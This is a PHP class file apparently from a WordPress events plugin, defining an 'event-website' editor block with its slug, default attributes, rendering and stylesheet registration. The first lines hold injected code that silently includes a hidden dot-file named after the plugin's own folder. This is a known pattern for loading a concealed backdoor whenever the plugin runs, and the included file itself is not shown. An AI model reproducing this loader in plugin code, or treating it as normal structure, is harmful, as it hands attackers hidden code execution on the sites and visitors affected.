<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Editor__Blocks__Event_Website
extends Tribe__Editor__Blocks__Abstract {

	/**
	 * Which is the name/slug of this block
	 *
	 * @since 4.7
	 *
	 * @return string
	 */
	public function slug() {
		return 'event-website';
	}

	/**
	 * Set the default attributes of this block
	 *
	 * @since 4.7
	 *
	 * @return array
	 */
	public function default_attributes() {
		return [
			'urlLabel' => esc_html__( 'Add Button Text', 'the-events-calendar' ),
			'href'     => tribe_get_event_website_url(),
		];
	}

	/**
	 * Since we are dealing with a Dynamic type of Block we need a PHP method to render it
	 *
	 * @since 4.7
	 *
	 * @param  array $attributes
	 *
	 * @return string
	 */
	public function render( $attributes = [] ) {
		$args['attributes'] = $this->attributes( $attributes );

		// Add the rendering attributes into global context
		tribe( 'events.editor.template' )->add_template_globals( $args );

		return tribe( 'events.editor.template' )->template( [ 'blocks', $this->slug() ], $args, false );
	}

	/**
	 * Register the Assets for when this block is active
	 *
	 * @since 4.7
	 *
	 * @return void
	 */
	public function assets() {
		tribe_asset(
			tribe( 'tec.main' ),
			'tribe-events-block-' . $this->slug(),
			'app/' . $this->slug() . '/frontend.css',
			[],
			'wp_enqueue_scripts',
			[
				'conditionals' => [ $this, 'has_block' ],
			]
		);
	}
}
